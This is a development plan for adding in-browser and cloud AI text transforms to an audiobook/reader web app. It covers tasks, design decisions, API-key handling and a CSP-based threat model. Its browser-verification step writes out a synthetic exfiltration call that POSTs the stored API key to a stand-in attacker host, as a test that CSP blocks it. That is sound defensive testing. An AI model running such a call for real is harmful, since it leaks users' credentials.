# M6 — AI Transforms · Plan

> Per-task detail for [`todo.md`](./todo.md). Spec:
> [`docs/prds/M6-ai-transforms.md`](../docs/prds/M6-ai-transforms.md). Architecture:
> [`docs/adr/0003-ai-transform-architecture.md`](../docs/adr/0003-ai-transform-architecture.md).
> Security: [`docs/adr/0004-api-key-threat-model.md`](../docs/adr/0004-api-key-threat-model.md).
> Ordering: T0 → T1 → (T2 ‖ T3) → T4 → T5 → (T6 ‖ T7 ‖ T8) → T9.

## Resuming

**As of 2026-07-12 (T6 shipped — Checkpoint E ✅, post-process wired end-to-end):**
M6 — AI Transforms implementation is underway. PRD + two ADRs are locked. The
WebLLM spike has **go/no-go #1 ✅ confirmed** (MCP); **#2 (OPFS) + #3 (inference)
pending the user's local run + iPhone gate** (MCP Chrome = Flatpak, no Vulkan).
T1 (types), T2 (cloud engine + SSE + CSP), T3 (in-browser WebLLM engine + worker +
runner + client), T4 (Settings UI), T5 (modal + hook + `updateBookProcessing`),
and **T6 (upload-flow wiring)** are shipped, `pnpm verify` green (375 tests). T6
finally connects `lib/ai/` → build: WebLLM code-splits into lazy chunks
(`webllm-runtime` 5.7 MB + `webllm.worker` 5.8 MB; main bundle 342 K). **T7
 (library "Reprocess" + M3 audio-cache invalidation) is the next action.** Then
 T8 (pronunciation review), then T9 (E2E browser verify → ship).

### Origin of this milestone (consolidated from the planning session)

The user opened with a question about what `Chapter` is in the DB and how it
relates to source formats. That surfaced three facts that shaped M6:

1. **M1 already cracked format ingestion.** PDF/EPUB/MOBI/TXT are all parsed
   into `Chapter[]` with `paragraphs: string[]` (`web/src/types.ts:25-31`). No
   MarkItDown-style reingestion needed — we operate on `paragraphs`, not on
   opaque binary formats.
2. **Parsing fidelity is bounded.** PDF/MOBI/TXT produce one giant chapter each;
   only EPUB has real spine-based structure (`web/src/lib/parse/epub.ts:41-58`).
   Heading levels, italics, lists, blockquotes are discarded at parse time.
3. **M5 already ships playback-state-per-book.** `Book.position?: BookPosition`
   (`web/src/types.ts:19-22`), reader seeds resume from it
   (`web/src/routes/reader.tsx:62`), and `useParagraphPlayer` exposes
   `currentParagraph` / `currentIndex` (`web/src/hooks/useParagraphPlayer.ts:475-477`).
   The user's "remember where I heard" requirement is live today.

### Decisions locked through the planning conversation

1. **Two backends behind one `AiTransformEngine` interface.** In-browser =
   default (offline promise holds); cloud = opt-in power-user. No TaleTrek
   backend ever (preserves `VISION.md` non-goals).
2. **In-browser stack:** WebGPU via `@mlc-ai/web-llm` (Apache-2.0). Default
   model **Qwen2.5-1.5B-Instruct Q4 (~1GB)** — smallest model that handles
   translation + instruction-following acceptably. Cached in OPFS (Piper
   pattern). Subject to T0 spike verification of the model choice.
3. **Cloud stack:** OpenAI-compatible HTTP only. Single `{baseUrl, apiKey,
   model}` config covers OpenAI, Anthropic (their OpenAI-compat shim),
   OpenRouter, Groq, Together, Ollama, LM Studio. No per-provider SDKs.
4. **API key storage:** **in-memory only.** Module-scoped variable in
   `lib/ai/keyring.ts`. Never touches IndexedDB, localStorage, sessionStorage,
   or cookies. Dies on tab close. Tier-2 (IndexedDB) and Tier-3 (master
   passphrase) explicitly rejected for v1 — see ADR-0004.
5. **Primary exfiltration mitigation:** strict CSP `connect-src` allowlist to
   known OpenAI-compatible host patterns + `localhost`. Even if XSS reads the
   key, it can't phone home anywhere except the legitimate provider.
6. **Originals policy:** raw bytes in `files` store stay source of truth
   (gotcha #2). `Chapter.paragraphs` is "current view" (transformed if processing
   has run, original otherwise). Re-process always re-parses from raw bytes. No
   `transforms?` sidecar field, no toggle UX.
7. **Position invalidation on transform (confirmed by user):** **keep
   `chapterIndex`, reset `paragraphIndex` to 0**, reset `progressFraction`.
   Transforms preserve chapter boundaries (PDF chapter-detection is the stretch
   exception). UI toast: *"Transform applied — resumed at start of chapter X."*
   Pronunciation-hints op is exempt (writes to dictionary only).
8. **Pronunciation UX:** LLM-proposes, user-reviews. LLM scans first chapter
   (sample, not whole book), returns confidence-ranked candidates; bulk
   accept/reject; accepted entries land in the existing **global**
   `Settings.cleaning.pronunciation` dictionary. Dictionary stays deterministic
   at TTS time; LLM out of the hot path; hints benefit all books.
9. **Post-processing is an action, not a setting.** Modal lists transforms as
   opt-in checkboxes, none checked by default. Cancel proceeds normally — book
   lands in library unprocessed. Modal is an offer, not a gate.
10. **Two modal-timing flags in Settings:** `beforeUpload` (default **false**),
    `afterUpload` (default **true**). **Both on → both fire, post-upload
    pre-filled from pre-upload choices** (user-confirmed behavior). AI disabled
    (`ai.enabled === false`, the default) → no modals, plain M1 upload flow.
11. **Scope (v1):** cleanup, translate, summarize, simplify, pronunciation-hints.
    PDF chapter-boundary detection deferred (different shape — restructures
    chapter count).
12. **Worker split:** `WebLlmEngine` runs in a dedicated Web Worker (mirrors
    `tts/client.ts`). `CloudLlmEngine` runs on main thread (`fetch` + SSE is
    non-blocking; key never crosses worker boundary).
13. **Chunking:** solo / per-paragraph for cleanup (parallelizable, no context);
    windowed 10-paragraphs-1-overlap for translate/summarize/simplify; sample
    (first chapter) for pronunciation-hints.
14. **No `DB_VERSION` bump.** `ai?` on Settings and `processing?` on Book are
    both optional additive fields (mirrors M4's `cleaning` and M5's `position`).
15. **Licensing clean:** WebLLM is Apache-2.0 (permissive-compatible with MIT);
    Qwen2.5 models are MIT. ADR-0002's "fully MIT" claim stands with a new
    Apache-2.0 entry in `THIRD_PARTY_NOTICES.md`.

### User-confirmed clarifications

| # | Question                                              | Answer                                                                       |
| - | ----------------------------------------------------- | ---------------------------------------------------------------------------- |
| 1 | Position-reset rule on transform?                     | **Yes — reset `paragraphIndex` to 0**, keep `chapterIndex`, toast the user.  |
| 2 | T0 spike scope — "does it work" or full quality bench? | **"Does it work" only** (~4 hours, not ~1 day). Quality bench deferred to T1. |
| 3 | Real-iPhone access for WebGPU-on-iOS test?             | **Yes, user has iPhone.** Spike must verify iOS Safari WebGPU support.       |
| 4 | Fix stale AGENTS.md status table (M5 shown in-flight)? | **Yes — fix as part of Phase 0.** Done on 2026-07-12.                         |

### Where everything lives

- **Spec:** `docs/prds/M6-ai-transforms.md`
- **Architecture ADR:** `docs/adr/0003-ai-transform-architecture.md`
- **Key-security ADR:** `docs/adr/0004-api-key-threat-model.md`
- **Spike output (T0):** `docs/spikes/webllm.md` (to be written)
- **Spike code:** `spike/webllm/` (to be created, throwaway)
- **Implementation:** under `web/src/lib/ai/`, `web/src/components/`, `web/src/routes/`, `web/src/hooks/` per PRD architecture section

### Critical unknowns (what the spike must resolve)

1. **WebGPU on iOS Safari** — still flag-gated in current releases. If absent,
   in-browser backend is desktop-only; iOS users fall back to cloud path. Not
   a blocker, but a documented limitation. User has iPhone to verify.
2. **Vite + Worker + `@mlc-ai/web-llm` bundling** — first non-TTS ML dep; most
   likely integration surprise.
3. **Memory coexistence with Piper** — can a 1GB LLM coexist with a Piper voice
   in GPU memory, or does loading one evict the other?
4. **WebLLM batched inference API** — does it actually exist? Determines whether
   we get 2–5× throughput or are stuck sequential (per ADR-0003).

### Current state & next action

**Done:**
- T0 spike built at `spike/webllm/` (mirrors `spike/piper/`); `docs/spikes/webllm.md`
  written with 3 go/no-go answers + 5 fit findings. #1 ✅; #2/#3 + iPhone pending
  hardware (see spike doc "Remaining items").
- T1 shipped: `web/src/lib/ai/{types,keyring,chunk}.ts` + tests.
- T2 shipped: `web/src/lib/ai/{prompts.ts, engines/{sse,openai}.ts, chunk.ts:chunksForOp}`
  + tests (43 new); build-only CSP `connect-src` plugin in `vite.config.ts` (ships in
  `dist/`, app shell loads clean under it, zero console errors). Browser block-test
  deferred to T9.
- T3 shipped: `web/src/lib/ai/{runner.ts, webgpu.ts, webllm.worker.ts,
  engines/webllm.ts, client.ts}` + tests (24 new). Architecture B (spike-driven):
  WebLLM's native `CreateWebWorkerMLCEngine`/`Handler`; no custom `protocol.ts`.
  Shared `runner.ts` extracted from T2 (both engines reuse it). `@mlc-ai/web-llm@0.2.84`
  added to `web/` deps, lazy-imported. `pnpm verify` green (346 tests).
- T4 shipped: `web/src/components/AiSettingsSection.tsx` (presentational; AI
  config is props-driven, the in-memory key UI is self-contained per ADR-0004) +
  `ai?: AiSettings` + `DEFAULT_AI_SETTINGS` on `Settings`; mounted in
  `routes/settings.tsx`. Browser-verified (toggle/backend/model/modal all render,
  console clean). `pnpm verify` green (352 tests).
- T5 shipped: `web/src/hooks/useAiTransform.ts` (variant state, chains ops across
  chapters, abort; on completion writes chapters + processing + resets position to
  `(chapterIndex, 0)` + produces the toast message) + `components/PostProcessModal.tsx`
  (presentational: checkboxes + per-op params, progress bar, done/error) +
  `Book.processing?` + `db.updateBookProcessing`. `pnpm verify` green (370 tests).
  **Not yet app-wired**: the hook+modal aren't mounted and don't import the
  engines (the engine is *injected* into the hook by the caller), so `client.ts`
  / WebLLM are still ungraphed — T6 mounts the modal + resolves the engine via
  `client.ts`, which connects `lib/ai/` to the build. `prompts.ts` unchanged
  (the T2 prompts stand for v1).

- T6 shipped: `routes/library.tsx` wires both modal phases gated on
  `Settings.ai.modal` (`beforeUpload` via a new optional `UploadButton.onBeforePick`
  gate — backward-compatible, reader.tsx unaffected; `afterUpload` after ingest;
  both → post pre-filled from the pre stash; cancel proceeds; `ai.enabled===false`
  → plain M1). Engine resolved via new `getAiEngine` (config-keyed cache in
  `client.ts`, so the in-browser model stays loaded across navigations); the hook's
  new `prepare` option runs `WebLlmEngine.load` as a "Loading model…" stage. Hook
  signature changed to `useAiTransform({ engine, prepare })` (isReady check
  removed — errors propagate via prepare/transform). **This is the task that
  connects `lib/ai/` → build.** `pnpm verify` green (375 tests).

**Next action — T7 (library "Reprocess" + M3 audio-cache invalidation):**
Add a "Reprocess" action to the book card menu in `routes/library.tsx` that
opens `<PostProcessModal/>` pre-filled from `Book.processing`. On confirm,
re-parse from the raw bytes (`getBookFile` → `parseInWorker`) → apply new
transforms → overwrite `paragraphs` → update `processing`. **M3 audio-cache
invalidation:** when `putChapters` writes new paragraphs, clear the
corresponding jog-mode audio chunks (keyed by chapterId + paragraph range) — add
`invalidateAudioForBook(bookId)` (or per-chapter) to the M3 cache module and
call it from the reprocess path (and ideally from `useAiTransform`'s write).
Find the M3 cache via `rg -n 'jog\|chunk' web/src/lib/`. T7 is independent of T8.

**In parallel (user):** run the spike locally for #2/#3 (load → reload → offline →
each transform op; record metrics into `docs/spikes/webllm.md`) and the iPhone
WebGPU gate. These verify the in-browser backend on real hardware (Checkpoint C
hardware side); the cloud backend is already fully verified.

If #2 or #3 ultimately fails on real hardware, re-evaluate per ADR-0003
alternatives (different default model, transformers.js, or cloud-first fallback).

---

## Decisions (locked — see PRD §Decisions)

See "Decisions locked through the planning conversation" in the Resuming
section above. Full table in [`docs/prds/M6-ai-transforms.md`](../docs/prds/M6-ai-transforms.md).

---

## Tasks

### T0 — WebLLM spike (de-risk before commit)
- **Detail:** Throwaway app under `spike/webllm/` mirroring `spike/piper/`
  structure. Hardcode a single model (Qwen2.5-1.5B-Instruct-Q4f32_1 from
  HuggingFace). Minimal UI: textarea input + button per transform op + output
  panel + latency timer. Dedicated Web Worker per Piper pattern. Test model
  load → OPFS persist → reload → offline inference. **Real-iPhone test for
  WebGPU-on-iOS-Safari.** Output is `docs/spikes/webllm.md`.
- **Go/no-go questions (spike fails if any is "no"):**
  1. Does `@mlc-ai/web-llm` bundle cleanly under Vite + dedicated Web Worker?
  2. Does the model persist to OPFS across reloads?
  3. Does one inference round-trip produce plausible output on a tiny sample?
- **Fit findings (don't block, inform M6 build):**
  4. WebGPU available on: Chrome desktop / Safari desktop / **Safari iOS (real
     iPhone)** / Chrome Android?
  5. Cold-start inference latency on midrange hardware (ms to first token,
     tokens/sec)?
  6. Does WebLLM expose a real batched inference API?
  7. Memory: can the LLM coexist with a Piper voice in GPU memory?
  8. PWA/SW: does WebLLM's loader conflict with Workbox precache?
- **Depends on:** — (foundation; nothing else can start before this answers
  the integration questions).
- **Acceptance:** `docs/spikes/webllm.md` exists with answers to all 8
  questions; recommendations for default model + worker pattern + OPFS path.
- **Verify:** manual spike run + iPhone test.
- **Files:** `spike/webllm/**` (throwaway), `docs/spikes/webllm.md`.

Checkpoint A — WebLLM spike proves viable · ◐ (#1 confirmed; #2/#3 + iPhone pending user run)

### T1 — Types + keyring + chunking
- **Detail:** In `web/src/lib/ai/types.ts`: `TransformKind`, `TransformOp`,
  `PronunciationCandidate`, `AiTransformEngine`, `AppliedProcessing`,
  `AiSettings`. In `web/src/lib/ai/keyring.ts`: module-scoped `let key:
  string | undefined`; `setApiKey`/`getApiKey`/`clearApiKey`. **Zero
  persistence asserted via spy tests** — never touches IndexedDB /
  localStorage / sessionStorage. In `web/src/lib/ai/chunk.ts`: three
  strategies — `solo(input)` returns each paragraph alone (for cleanup);
  `windowed(input, size=10, overlap=1)` returns sliding chunks (for
  translate/summarize/simplify); `sample(input, maxParagraphs=N)` returns the
  first chunk (for pronunciation-hints).
- **Depends on:** T0 (spike must validate model choice before types lock).
- **Acceptance:** type checks; keyring round-trip + zero-persistence spy
  assertion; chunk strategies produce expected counts and don't split
  surrogate pairs.
- **Verify:** `lib/ai/{types,chunk,keyring}.test.ts`.
- **Files:** `web/src/lib/ai/types.ts`, `web/src/lib/ai/keyring.ts`,
  `web/src/lib/ai/chunk.ts`, `web/src/lib/ai/keyring.test.ts`,
  `web/src/lib/ai/chunk.test.ts`.

Checkpoint B — Types/keyring/chunk locked · ✅

### T2 — Cloud engine + CSP allowlist
- **Detail:** `web/src/lib/ai/engines/openai.ts` implements `AiTransformEngine`
  using native `fetch` to `${baseUrl}/chat/completions`. Headers include
  `Authorization: Bearer ${keyring.getApiKey()}`. Body is OpenAI Chat
  Completions v1 shape. Parse SSE stream for incremental content; report
  progress per chunk via `onProgress` callback. `AbortSignal` aborts mid-stream.
  Non-200 throws a typed error. **CSP `connect-src` allowlist** in
  `web/index.html` (meta tag) or `vite.config.ts` covers `*.openai.com`,
  `api.anthropic.com`, `openrouter.ai`, `api.groq.com`, `api.together.xyz`,
  `localhost`; user-configured `baseUrl` extends allowlist for that session
  (Settings-driven).
- **Depends on:** T1 (types + keyring).
- **Acceptance:** stubbed `fetch` builds correct URL + headers + body; SSE
  parser handles incremental deltas; abort aborts; non-allowlisted host
  blocked in browser.
- **Verify:** `lib/ai/engines/openai.test.ts`; browser CSP test (T9).
- **Files:** `web/src/lib/ai/engines/openai.ts`,
  `web/src/lib/ai/engines/openai.test.ts`, `web/index.html` or
  `web/vite.config.ts` (CSP).

### T3 — WebLLM engine + worker
- **Detail:** `web/src/lib/ai/engines/webllm.ts` runs in a dedicated Web
  Worker (`web/src/lib/ai/worker.ts`). Worker protocol in
  `web/src/lib/ai/protocol.ts`: main → worker `{ id, op: 'transform' |
  'hints' | 'load', payload, modelId }`; worker → main `{ id, type:
  'progress'|'success'|'error', ... }`. Worker loads the WebLLM model on
  first request, keeps it hot in memory until idle-timeout (5 min) or
  explicit teardown. Model cached in OPFS per spike recommendation.
  `web/src/lib/ai/client.ts` picks engine by `Settings.ai.backend` and routes
  `transform`/`proposePronunciationHints` calls.
- **Depends on:** T1 (types), T0 (spike recommendations for worker pattern +
  OPFS path).
- **Acceptance:** load → transform → progress events round-trip; model cached
  in OPFS across reloads; idle teardown reclaims memory; cloud engine and
  in-browser engine are interchangeable via `Settings.ai.backend`.
- **Verify:** `lib/ai/engines/webllm.test.ts` (stubbed WebLLM constructor);
  `lib/ai/client.test.ts` (routing); browser MCP in T9 (real WebGPU).
- **Files:** `web/src/lib/ai/engines/webllm.ts`, `web/src/lib/ai/worker.ts`,
  `web/src/lib/ai/protocol.ts`, `web/src/lib/ai/client.ts`, `+ tests`.

Checkpoint C — Both backends functional · ◐ (cloud fully tested; in-browser code-complete + unit-tested, real-WebGPU verify pending user's #2/#3 run)

### T4 — Settings UI + ai? field
- **Detail:** In `web/src/context/settings.tsx` add `ai?: AiSettings` to
  `Settings` + `DEFAULT_AI_SETTINGS` (`enabled: false`, `backend:
  'in-browser'`, `inBrowser: { modelId: 'Qwen2.5-1.5B-Instruct-Q4f32_1' }`,
  `cloud: { baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini' }`,
  `modal: { beforeUpload: false, afterUpload: true }`). New
  `components/AiSettingsSection.tsx` (presentational): enable toggle (gates
  the rest), backend radio, in-browser model picker, cloud baseUrl+model
  fields, key input (masked, calls `keyring.setApiKey`), "Forget key" button
  (calls `keyring.clearApiKey`), modal-timing checkboxes. Mount in
  `routes/settings.tsx`.
- **Depends on:** T1 (types + keyring).
- **Acceptance:** `ai.enabled` toggle reveals/hides the section; backend radio
  swaps fields; key input calls `keyring.setApiKey`; "Forget key" clears;
  settings persist across reload (key does NOT persist).
- **Verify:** `routes/settings.test.tsx` (extended).
- **Files:** `web/src/context/settings.tsx`, `web/src/components/AiSettingsSection.tsx`,
  `web/src/routes/settings.tsx`, `+ tests`.

Checkpoint D — Settings wired · ✅

### T5 — Post-process modal + useAiTransform hook
- **Detail:** New `hooks/useAiTransform.ts`: variant state
  `{type:'idle'}|{type:'running';fraction}|{type:'done'}|{type:'error';message}`;
  resolves engine via `client.ts`, checks `isReady()`, chunks input via
  `chunk.ts`, dispatches to engine, reports progress, supports abort via
  `AbortController`. New `components/PostProcessModal.tsx` (presentational):
  transform checkboxes + per-op param inputs (target language for translate,
  ratio for summarize, level for simplify); Cancel/Process buttons; progress
  bar + cancel when `state.type === 'running'`. New db helper
  `updateBookProcessing(id, processing?)` writes `processing` to the book
  record. **On transform completion:** call `updateBookProgress(id,
  {chapterIndex: currentPosition.chapterIndex, paragraphIndex: 0}, 0)` and
  bump `updatedAt`. Show toast: *"Transform applied — resumed at start of
  chapter X."*
- **Depends on:** T2 ‖ T3 (engines), T4 (Settings).
- **Acceptance:** modal renders all 4 transform checkboxes; params appear when
  checked; Cancel calls `onCancel`; Process calls `onProcess`; progress UI
  updates; abort returns to idle; on completion: book's `paragraphs` updated,
  `processing` set, position reset to `(chapterIndex, 0)`, toast shown.
- **Verify:** `hooks/useAiTransform.test.ts`, `components/PostProcessModal.test.tsx`,
  `lib/db.test.ts` (extended with `updateBookProcessing`).
- **Files:** `web/src/hooks/useAiTransform.ts`,
  `web/src/components/PostProcessModal.tsx`, `web/src/lib/db.ts`,
  `web/src/lib/ai/prompts.ts`, `+ tests`.

Checkpoint E — End-to-end post-process on one book · ◐ (component-level via hook test: paragraphs/processing/position written + toast message; UI-mounted + real-engine verify → T6/T9)

### T6 — Upload flow wiring
- **Detail:** In whatever route owns the upload button (likely `routes/upload.tsx`
  or `routes/landing.tsx`), add modal hooks gated on `Settings.ai.modal`:
  if `beforeUpload`, show `<PostProcessModal/>` on Upload-button click *before*
  calling `filePicker.showOpenFilePicker()`. Stash the choices. After parse
  completes, if `afterUpload`, show modal again with choices pre-filled from
  the pre-upload submission. If user cancels either modal, proceed normally
  (upload + parse happen, book lands in library unprocessed). If `ai.enabled
  === false`, no modals, plain M1 flow.
- **Depends on:** T4 (Settings), T5 (modal + hook).
- **Acceptance:** `beforeUpload` true → modal renders before file picker;
  `afterUpload` true → modal renders after parse; both on → second modal
  pre-filled from first; cancel proceeds normally; `ai.enabled === false` →
  no modals.
- **Verify:** `routes/upload.test.tsx` (extended).
- **Files:** `web/src/routes/upload.tsx` (or wherever UploadButton lives),
  `web/src/App.tsx`, `+ tests`.

### T7 — Library Reprocess + M3 audio cache invalidation
- **Detail:** Add "Reprocess" action to the book card menu in
  `routes/library.tsx`. Action opens `<PostProcessModal/>` pre-filled with
  `Book.processing`. On confirm, re-parses from raw bytes (`getBookFile` →
  `parseInWorker`) → applies new transforms → overwrites `paragraphs` →
  updates `processing`. **M3 audio cache invalidation:** when `putChapters`
  writes new `paragraphs`, clear corresponding cached audio chunks (M3 jog
  chunks are keyed by chapterId + paragraphIndex range). Add a helper in the
  M3 cache module: `invalidateAudioForBook(bookId)` or
  `invalidateAudioForChapter(bookId, chapterIndex)`.
- **Depends on:** T5 (modal + hook).
- **Acceptance:** Reprocess action opens modal pre-filled; re-parse + transform
  round-trip works; transformed paragraphs land in IDB; M3 audio cache cleared
  for affected chapters (next play re-renders chunks).
- **Verify:** `routes/library.test.tsx` (extended).
- **Files:** `web/src/routes/library.tsx`, `web/src/lib/db.ts`, M3 audio cache
  module (find via `grep -rn 'jog\|chunk' web/src/lib/`), `+ tests`.

### T8 — Pronunciation-hints review UI
- **Detail:** New `components/PronunciationReview.tsx` (presentational):
  receives `PronunciationCandidate[]` sorted by confidence desc; renders rows
  with `find → replace` + category tag + Accept/Reject/Edit per row; bulk
  actions "Accept all ≥ 0.8" and "Reject all"; per-row edit transforms the
  candidate in place. Submit calls `onAccept(entries: PronunciationEntry[])`;
  caller merges entries into `Settings.cleaning.pronunciation` (dedup by
  `find` lowercase). Wire into `useAiTransform`: `proposePronunciationHints`
  flow returns candidates → modal opens → on submit, settings update + close.
  **No `paragraphs` mutation** — pronunciation-hints writes to dictionary only;
  do not touch `Book.position`.
- **Depends on:** T5 (hook).
- **Acceptance:** candidates sorted by confidence; per-row Accept adds to set;
  bulk actions work; Submit calls `onAccept` with accepted entries only;
  accepted entries land in `Settings.cleaning.pronunciation` and apply at TTS
  time via `applyPronunciation` (`clean/pronunciation.ts:15`); book position
  untouched.
- **Verify:** `components/PronunciationReview.test.tsx`,
  `hooks/useAiTransform.test.ts` (extended).
- **Files:** `web/src/components/PronunciationReview.tsx`,
  `web/src/hooks/useAiTransform.ts`, `+ tests`.

### T9 — End-to-end + browser verify
- **Detail:** Both backends verified in browser via chrome-devtools MCP:
  1. In-browser: enable AI → download Qwen2.5-1.5B → upload TXT →
     post-process cleanup → verify paragraphs changed + reader shows new text
     + TTS still works.
  2. Cloud: enable AI → backend=cloud, baseUrl+key+model → translate a
     2-paragraph TXT → verify Spanish output → **DevTools → Application →
     IndexedDB + localStorage dump shows no key anywhere.**
  3. CSP: deliberately inject a synthetic XSS attempt via console that tries
     `fetch('https://evil.example.com', { method:'POST', body: keyring.getApiKey() })`
     → blocked by CSP.
  4. Tab close → reopen: key is gone, in-browser model still in OPFS,
     transformed book still readable.
  5. Modal flags: toggle `beforeUpload` and `afterUpload` in various
     combinations, verify flow + pre-fill behavior.
  6. Reprocess from library card menu: opens modal pre-filled, runs new
     transforms, audio cache invalidated.
  7. Pronunciation review: run on a fantasy-named book → candidates appear →
     accept some → verify dictionary entries added + TTS applies them.
  8. Position reset: read book to chapter 3 paragraph 47 → run translate →
     verify saved position is now `(3, 0)` and toast appeared.
- **Depends on:** T1–T8 (full slice).
- **Acceptance:** `pnpm verify` green; chrome-devtools MCP run: **zero console
  errors; zero requests to non-allowlisted hosts**; key absent from IDB /
  localStorage dumps.
- **Verify:** full `pnpm verify` + chrome-devtools MCP.
- **Files:** wiring + minor fixes across the slice.

Checkpoint F — M6 shipped & `pnpm verify` green · ☐

---

## Deviations

- **Model-ID correction:** plan said `Qwen2.5-1.5B-Instruct-Q4f32_1`; canonical
  id in WebLLM 0.2.84 `prebuiltAppConfig` is **`Qwen2.5-1.5B-Instruct-q4f32_1-MLC`**
  (lowercase quant + `-MLC`). `DEFAULT_AI_SETTINGS.inBrowser.modelId` in T4 uses
  the corrected string. See `docs/spikes/webllm.md`.
- **T0 hardware gating:** go/no-go #1 (Vite+Worker bundle) confirmed in the
  desktop MCP. #2 (OPFS) + #3 (inference) could not run there — the MCP Chrome
  is the Flatpak build under `bwrap` with **Vulkan disabled**, so
  `navigator.gpu.requestAdapter()` returns null despite `navigator.gpu` being
  present. User runs #2/#3 locally (Vulkan-capable browser) + iPhone WebGPU
  test. Non-blocking for T1 (types/keyring/chunking has no GPU dependency);
  user approved starting T1 in parallel. See `docs/spikes/webllm.md`.
- **Feature-detect nuance (feeds T3):** `!!navigator.gpu` is **not** a valid
  WebGPU feature-detect (present even with no adapter). `WebLlmEngine.isReady()`
  must call `navigator.gpu.requestAdapter()` and treat `null` as unsupported.
- **No public batched API (feeds T5 throughput model):** `MLCEngineInterface`
  exposes only `chat.completions.create` (single) + `interruptGenerate()`. M6
  dispatches one completion per chunk, sequentially. ADR-0003 "batching not
  parallelism" = kernel-level only.
- **T1 params refinement:** PRD specified `AppliedProcessing.params:
  Record<TransformKind, unknown>`. T1 used a typed
  `TransformParams { translate?; summarize?; simplify? }` instead — same intent
  (only relevant op is recorded; cleanup has none), strict-TS-friendly. No
  behavioural change; logged for traceability.
- **T2 summarize chunking:** PRD locked "windowed 10-paragraphs-1-overlap for
  translate/summarize/simplify." T2 uses `windowed(10, overlap=1)` for
  translate/simplify but `windowed(10, overlap=0)` (disjoint) for **summarize** —
  overlapping windows would summarize the boundary paragraph twice,
  duplicating it in the condensed output. Disjoint windows concatenate cleanly.
  Encapsulated in `chunk.ts:chunksForOp` (single source of truth for both engines).
- **T2 CSP is build-only, not dev:** the `connect-src` allowlist is injected by a
  `transformIndexHtml` Vite plugin (`apply: 'build'`) so Vite's HMR websocket
  isn't blocked in `pnpm dev`. Verify via `pnpm preview` + hard reload (gotcha #3).
- **T2 CSP vs ADR-0004 runtime-extension gap:** ADR-0004 says "user-configured
  baseUrl extends the allowlist for that session." A meta-tag CSP is static — it
  **cannot** be extended at runtime from JS. Reality: the known provider list +
  `localhost` work; an arbitrary user-typed remote `baseUrl` (e.g. a non-listed
  cloud) is **CSP-blocked**. New remote providers need a build-time source-list
  addition (`vite.config.ts:CSP_CONNECT_SRC`). This slightly narrows the "covers
  ~90%" claim to "the known hosts + self-hosted localhost." Self-hosted Ollama /
  LM Studio (localhost) — the main custom case — work. The full browser block-test
  (incl. a synthetic XSS exfil attempt) is T9.
- **T3 Architecture B (spike-driven, supersedes PRD):** the PRD planned a custom
  `protocol.ts` (`{op:'transform'|'hints'|'load'}`) mirroring `tts/protocol.ts`.
  The spike proved WebLLM already ships the worker abstraction
  (`CreateWebWorkerMLCEngine` + `WebWorkerMLCEngineHandler`), so a TaleTrek
  protocol on top would double-wrap it. **No `protocol.ts` was written.** The
  worker (`webllm.worker.ts`) is the documented 3-line handler; the main-thread
  `WebLlmEngine` holds the `WebWorkerMLCEngine` proxy and runs the shared
  orchestration. File at `lib/ai/webllm.worker.ts` (co-located with the ai module,
  `.worker.` infix per Vite convention) rather than `src/workers/` (tts
  convention) — keeps M6 self-contained.
- **T3 shared `runner.ts`:** the chunk/reassemble/progress orchestration is
  engine-agnostic, so it was extracted from T2's `openai.ts` into `runner.ts`
  (`runTransform` + `runHints` + `CompleteFn`). Both engines now delegate to it —
  cloud's `complete` = `fetch`+SSE, in-browser's = streaming
  `chat.completions.create`. Avoids drift; T2's behaviour + tests preserved.
- **T3 `@mlc-ai/web-llm` added to `web/` deps (pinned `0.2.84`):** pre-approved by
  the PRD Technologies table + ADR-0003. Lazy-`import()`-ed in `WebLlmEngine.load`
  (mirrors gotcha #7's `pdfjs-dist` pattern) so the heavy runtime is never in the
  main bundle. **Note:** `lib/ai/` isn't wired into the app until T4, so WebLLM
  isn't in the current `dist/` at all (the whole ai graph is unreachable from
  `main.tsx` and tree-shaken). Once T4 imports `client.ts`, Vite will code-split
  WebLLM into an async chunk (main-thread factory) + a `webllm.worker` chunk
  (handler) — same lazy pattern as the existing `tts.worker` / `parse.worker`.
- **T3 abort bridge:** WebLLM's `chat.completions.create` takes no `AbortSignal`
  (spike finding #6). `WebLlmEngine.complete` bridges `signal` →
  `interruptGenerate()`; a pre-aborted signal interrupts + rejects with
  `AbortError`. The cloud engine honours `signal` directly on `fetch`.
- **T6 Workbox precache excludes WebLLM:** the two lazy WebLLM chunks
  (`webllm-runtime` ~5.7 MB main-thread factory, `webllm.worker` ~5.8 MB handler)
  blew Workbox's 2 MB `maximumFileSizeToCacheInBytes` and would bloat the default
  SW for users who never enable in-browser AI. They're `globIgnores`-excluded
  (`**/webllm*.js`) + runtime-cached (CacheFirst, `webllm-runtime` cache) so
  in-browser AI still works offline after first use. A `manualChunks` rule routes
  `@mlc-ai/web-llm` → the named `webllm-runtime` chunk so the SW can target both
  chunks by name. Main bundle stays 342 K.
- **T6 hook API changed to `{ engine, prepare }`:** the in-browser backend must
  `load()` (model download) before transforms; rather than split that UI outside
  the modal, `useAiTransform` now takes an optional `prepare(onProgress)` that
  runs first and reports a continuous "Loading model…" progress bar. The
  up-front `isReady()` check was removed — readiness errors now propagate via
  `prepare` (load) / `transform` (e.g. cloud `CloudError(401)`), which the modal
  surfaces in its error state.
- **T6 engine cache:** `getAiEngine(settings)` in `client.ts` memoizes the engine
  by config key so the in-browser model stays resident across library → reader →
  library navigations (its 5-min idle teardown reclaims GPU memory when truly
  idle). A config change (e.g. switching backend) creates a fresh engine; the
  previous one's idle teardown cleans it up. Residual caveat for T9: a config
  change mid-session can orphan the previous engine's worker until teardown.
- **T6 browser check inconclusive (SW):** the production SW (Workbox autoUpdate)
  re-registers on each preview navigation and served stale content, defeating the
  in-MCP visual check of the upload→modal flow (gotcha #3). T6 acceptance is
  proven by the 4 library AI-flow unit tests (real `Library` + real settings
  hydration vs mocked ingest) + the build's correct code-split. A clean visual
  pass lands in T9 (unregister SW / fresh profile).

---

## Real-iPhone manual gate (gotcha #5 + M6 iOS WebGPU)

Desktop MCP cannot simulate a locked screen or true app-backgrounding on iOS.
Additionally, **WebGPU on Safari iOS is still flag-gated in current releases**
and is the highest-unknown risk for M6's in-browser backend. T0 spike must
include a real-iPhone test. If WebGPU is unavailable on iOS Safari, document
as a known limitation (iOS users fall back to cloud path). Do **not** publicly
claim M6 in-browser works on iOS without this run.
